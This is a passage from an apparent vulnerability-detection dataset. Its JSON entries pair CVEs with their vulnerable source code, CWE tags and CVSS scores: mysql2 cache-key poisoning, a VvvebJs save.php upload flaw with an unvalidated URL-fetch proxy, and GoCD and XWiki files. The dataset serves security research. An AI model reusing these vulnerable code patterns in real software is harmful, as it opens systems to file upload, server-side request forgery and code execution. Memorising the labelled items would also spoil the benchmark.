base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 93,
          "content": "        try:"
        },
        {
          "line_no": 99,
          "content": "        except ValueError:"
        },
        {
          "line_no": 100,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 101,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 572,
    "cve": "CVE-2024-21507",
    "description": "Versions of the package mysql2 before 3.9.3 are vulnerable to Improper Input Validation through the keyFromFields function, resulting in cache poisoning. An attacker can inject a colon (:) character within a value of the attacker-crafted key.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/parsers/parser_cache.js",
          "content": "'use strict';\n\nconst LRU = require('lru-cache').default;\n\nconst parserCache = new LRU({\n  max: 15000\n});\n\nfunction keyFromFields(type, fields, options, config) {\n  let res =\n    `${type}` +\n    `/${typeof options.nestTables}` +\n    `/${options.nestTables}` +\n    `/${options.rowsAsArray}` +\n    `/${options.supportBigNumbers || config.supportBigNumbers}` +\n    `/${options.bigNumberStrings || config.bigNumberStrings}` +\n    `/${typeof options.typeCast}` +\n    `/${options.timezone || config.timezone}` +\n    `/${options.decimalNumbers}` +\n    `/${options.dateStrings}`;\n  for (let i = 0; i < fields.length; ++i) {\n    const field = fields[i];\n    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;\n  }\n  return res;\n}\n\nfunction getParser(type, fields, options, config, compiler) {\n  const key = keyFromFields(type, fields, options, config);\n  let parser = parserCache.get(key);\n\n  if (parser) {\n    return parser;\n  }\n\n  parser = compiler(fields, options, config);\n  parserCache.set(key, parser);\n  return parser;\n}\n\nfunction setMaxCache(max) {\n  parserCache.max = max;\n}\n\nfunction clearCache() {\n  parserCache.clear();\n}\n\nmodule.exports = {\n  getParser: getParser,\n  setMaxCache: setMaxCache,\n  clearCache: clearCache\n};\n"
        }
      ],
      "method_level": [
        "function keyFromFields(type, fields, options, config) {\n  let res =\n    `${type}` +\n    `/${typeof options.nestTables}` +\n    `/${options.nestTables}` +\n    `/${options.rowsAsArray}` +\n    `/${options.supportBigNumbers || config.supportBigNumbers}` +\n    `/${options.bigNumberStrings || config.bigNumberStrings}` +\n    `/${typeof options.typeCast}` +\n    `/${options.timezone || config.timezone}` +\n    `/${options.decimalNumbers}` +\n    `/${options.dateStrings}`;\n  for (let i = 0; i < fields.length; ++i) {\n    const field = fields[i];\n    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;\n  }\n  return res;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 10,
          "content": "  let res ="
        },
        {
          "line_no": 11,
          "content": "    `${type}` +"
        },
        {
          "line_no": 12,
          "content": "    `/${typeof options.nestTables}` +"
        },
        {
          "line_no": 13,
          "content": "    `/${options.nestTables}` +"
        },
        {
          "line_no": 14,
          "content": "    `/${options.rowsAsArray}` +"
        },
        {
          "line_no": 15,
          "content": "    `/${options.supportBigNumbers || config.supportBigNumbers}` +"
        },
        {
          "line_no": 16,
          "content": "    `/${options.bigNumberStrings || config.bigNumberStrings}` +"
        },
        {
          "line_no": 17,
          "content": "    `/${typeof options.typeCast}` +"
        },
        {
          "line_no": 18,
          "content": "    `/${options.timezone || config.timezone}` +"
        },
        {
          "line_no": 19,
          "content": "    `/${options.decimalNumbers}` +"
        },
        {
          "line_no": 20,
          "content": "    `/${options.dateStrings}`;"
        },
        {
          "line_no": 23,
          "content": "    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;"
        },
        {
          "line_no": 25,
          "content": "  return res;"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 507,
    "cve": "CVE-2024-29272",
    "description": "Arbitrary File Upload vulnerability in VvvebJs before version 1.7.5, allows unauthenticated remote attackers to execute arbitrary code and obtain sensitive information via the sanitizeFileName parameter in save.php.",
    "vulnerability": {
      "file_level": [
        {
          "name": "save.php",
          "content": "<?php\n/*\nCopyright 2017 Ziadin Givan\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\nhttps://github.com/givanz/VvvebJs\n*/\n\ndefine('MAX_FILE_LIMIT', 1024 * 1024 * 2);//2 Megabytes max html file size\n\nfunction sanitizeFileName($file, $allowedExtension = 'html') {\n\t//sanitize, remove double dot .. and remove get parameters if any\n\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));\n\t\n\t//allow only .html extension\n\tif ($allowedExtension) {\n\t\t$file = preg_replace('/\\.[^.]+$/', '', $file) . \".$allowedExtension\";\n\t}\n\treturn $file;\n}\n\nfunction showError($error) {\n\theader($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);\n\tdie($error);\n}\n\n$html   = '';\n$file   = '';\n$action = '';\n\nif (isset($_POST['startTemplateUrl']) && !empty($_POST['startTemplateUrl'])) {\n\t$startTemplateUrl = sanitizeFileName($_POST['startTemplateUrl']);\n\t$html = file_get_contents($startTemplateUrl);\n} else if (isset($_POST['html'])){\n\t$html = substr($_POST['html'], 0, MAX_FILE_LIMIT);\n}\n\nif (isset($_POST['file'])) {\n\t$file = sanitizeFileName($_POST['file'], false);\n}\n\nif (isset($_GET['action'])) {\n\t$action = $_GET['action'];\n}\n\nif ($action) {\n\t//file manager actions, delete and rename\n\tswitch ($action) {\n\t\tcase 'rename':\n\t\t\t$newfile = sanitizeFileName($_POST['newfile'], false);\n\t\t\tif ($file && $newfile) {\n\t\t\t\tif (rename($file, $newfile)) {\n\t\t\t\t\techo \"File '$file' renamed to '$newfile'\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error renaming file '$file' renamed to '$newfile'\");\n\t\t\t\t}\n\t\t\t}\n\t\tbreak;\n\t\tcase 'delete':\n\t\t\tif ($file) {\n\t\t\t\tif (unlink($file)) {\n\t\t\t\t\techo \"File '$file' deleted\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error deleting file '$file'\");\n\t\t\t\t}\n\t\t\t}\n\t\tbreak;\n\t\tcase 'saveReusable':\n\t\t    //block or section\n\t\t\t$type = $_POST['type'] ?? false;\n\t\t\t$name = $_POST['name'] ?? false;\n\t\t\t$html = $_POST['html'] ?? false;\n\t\t\t\n\t\t\tif ($type && $name && $html) {\n\t\t\t\t\n\t\t\t\t$file = sanitizeFileName(\"$type/$name\");\n\t\t\t\t$dir = dirname($file);\n\t\t\t\tif (!is_dir($dir)) {\n\t\t\t\t\techo \"$dir folder does not exist\\n\";\n\t\t\t\t\tif (mkdir($dir, 0777, true)) {\n\t\t\t\t\t\techo \"$dir folder was created\\n\";\n\t\t\t\t\t} else {\n\t\t\t\t\t\tshowError(\"Error creating folder '$dir'\\n\");\n\t\t\t\t\t}\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (file_put_contents($file, $html)) {\n\t\t\t\t\techo \"File saved '$file'\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error saving file '$file'\\nPossible causes are missing write permission or incorrect file path!\");\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tshowError(\"Missing reusable element data!\\n\");\n\t\t\t}\n\t\tbreak;\n\t\tcase 'oembedProxy':\n\t\t\theader('Content-Type: application/json');\n\t\t\techo file_get_contents($_GET['url']);\n\t\tbreak;\n\t\tdefault:\n\t\t\tshowError(\"Invalid action '$action'!\");\n\t}\n} else {\n\t//save page\n\tif ($html) {\n\t\tif ($file) {\n\t\t\t$dir = dirname($file);\n\t\t\tif (!is_dir($dir)) {\n\t\t\t\techo \"$dir folder does not exist\\n\";\n\t\t\t\tif (mkdir($dir, 0777, true)) {\n\t\t\t\t\techo \"$dir folder was created\\n\";\n\t\t\t\t} else {\n\t\t\t\t\tshowError(\"Error creating folder '$dir'\\n\");\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (file_put_contents($file, $html)) {\n\t\t\t\techo \"File saved '$file'\";\n\t\t\t} else {\n\t\t\t\tshowError(\"Error saving file '$file'\\nPossible causes are missing write permission or incorrect file path!\");\n\t\t\t}\t\n\t\t} else {\n\t\t\tshowError('Filename is empty!');\n\t\t}\n\t} else {\n\t\tshowError('Html content is empty!');\n\t}\n}\n"
        }
      ],
      "method_level": [
        "function sanitizeFileName($file, $allowedExtension = 'html') {\n\t//sanitize, remove double dot .. and remove get parameters if any\n\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));\n\t\n\t//allow only .html extension\n\tif ($allowedExtension) {\n\t\t$file = preg_replace('/\\.[^.]+$/', '', $file) . \".$allowedExtension\";\n\t}\n\treturn $file;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "\t$file = __DIR__ . '/' . preg_replace('@\\?.*$@' , '', preg_replace('@\\.{2,}@' , '', preg_replace('@[^\\/\\\\a-zA-Z0-9\\-\\._]@', '', $file)));"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1348,
    "cve": "CVE-2024-56320",
    "description": "GoCD is a continuous deliver server. GoCD versions prior to 24.5.0 are vulnerable to admin privilege escalation due to improper authorization of access to the admin \"Configuration XML\" UI feature, and its associated API. A malicious insider/existing authenticated GoCD user with an existing GoCD user account could abuse this vulnerability to access information intended only for GoCD admins, or to escalate their privileges to that of a GoCD admin in a persistent manner. it is not possible for this vulnerability to be abused prior to authentication/login. The issue is fixed in GoCD 24.5.0. GoCD users who are not able to immediate upgrade can mitigate this issue by using a reverse proxy, WAF or similar to externally block access paths with a `/go/rails/` prefix. Blocking this route causes no loss of functionality. If it is not possible to upgrade or block the above route, consider reducing the GoCD user base to more trusted set of users, including temporarily disabling use of plugins such as the guest-login-plugin, which allow limited anonymous access as a regular user account.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/src/main/webapp/WEB-INF/rails/spec/support/extra_spec_assertions.rb",
          "content": "#\n# Copyright 2024 Thoughtworks, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nmodule ExtraSpecAssertions\n  def assert_redirect(url)\n    expect(response.status).to eq(302)\n    expect(response.redirect_url).to match(%r{#{url}})\n  end\nend"
        }
      ],
      "method_level": [
        "def assert_redirect(url)\n    expect(response.status).to eq(302)\n    expect(response.redirect_url).to match(%r{#{url}})\n  end"
      ],
      "hunk_level": [
        {
          "line_no": 18,
          "content": "  def assert_redirect(url)"
        },
        {
          "line_no": 19,
          "content": "    expect(response.status).to eq(302)"
        },
        {
          "line_no": 20,
          "content": "    expect(response.redirect_url).to match(%r{#{url}})"
        },
        {
          "line_no": 21,
          "content": "  end"
        }
      ]
    },
    "cwe": [
      "CWE-285"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.4,
    "cvss_version": 4.0
  },
  {
    "id": 618,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 122,
    "cve": "CVE-2024-23679",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
